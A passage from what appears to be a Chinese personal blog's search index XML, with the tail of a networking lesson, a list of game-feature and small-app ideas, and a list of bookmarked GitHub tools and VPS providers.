明天预告</h2><p><strong>第2天：网络的分类和拓扑结构</strong></p><p>我们将学习：</p><ul><li>LAN、WAN、MAN是什么？</li><li>网络拓扑结构有哪些？</li><li>如何绘制网络拓扑图？</li></ul><hr><p>💡 <strong>今日金句</strong>：万丈高楼平地起，网络学习第一步！</p><p>👉 <a href="../../README.md">返回目录</a> | <a href="day02.md">下一天：网络的分类和拓扑结构</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>about</title>
    <link href="/2025/10/29/about/"/>
    <url>/2025/10/29/about/</url>
    
    <content type="html"><![CDATA[<p>第一阶段（快速提升趣味性）：</p><ol><li>机缘系统 - 增加随机惊喜</li><li>连招系统 - 让战斗更有策略</li><li>灵兽系统 - 增加收集要素</li></ol><p>第二阶段（增加深度）：<br>4. 悟道系统 - 策略性成长<br>5. 道侣系统 - 情感投入<br>6. 秘境探索 - 内容扩充</p><p>第三阶段（长期目标）：<br>7. 成就系统 - 增加重玩价值<br>8. 轮回强化 - New Game+<br>9. 动态剧情 - 提升叙事品质</p><p>小应用思路：</p><p>聚焦“每日情绪打卡＋简易建议”应用</p><p>或“短时放松 + 呼吸／冥想”模块：适合美国用户快节奏生活</p><p>强化 iOS 本地处理＋隐私保障，会是加分项</p><p>本地化社群+手帐/规划应用</p><p>为什么有机会：欧洲多个国家语言多样、用户偏好本地化服务；且“轻量规划工具”在小应用里好切入。<br>小应用思路：</p><p>针对某国（如德国、法国、西班牙）市场的“月度预算规划＋支出可视化”工具</p><p>或“学习某语言／文化习惯”辅助工具：结合当地节日、任务打卡</p><p>强调“数据留设备端”“隐私保护”作为卖点</p>]]></content>
    
    
    
    <tags>
      
      <tag>“info&quot;,&quot;zen&quot;</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>myruls</title>
    <link href="/2025/10/29/myruls/"/>
    <url>/2025/10/29/myruls/</url>
    
    <content type="html"><![CDATA[<p>日常收集到的一些当时可能觉得有趣的东西</p><h1>AI</h1><p><a href="https://github.com/B3o/GPTS-Prompt-Collection">提示词搜集</a></p><h1>素材</h1><p><a href="https://github.com/renpy/renpy">回合制游戏引擎</a></p><p><a href="https://github.com/CorentinTh/it-tools">IT工具</a></p><p><a href="https://github.com/qdhenry/Claude-Command-Suite">Skills</a></p><p><a href="https://github.com/collections/game-engines">游戏引擎集合</a></p><h1>VPS</h1><p><a href="https://cloud.zheanyun.com">浙安云</a></p><p><a href="https://app.cloudcone.com">cloudcone</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>“url”,&quot;project&quot;</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
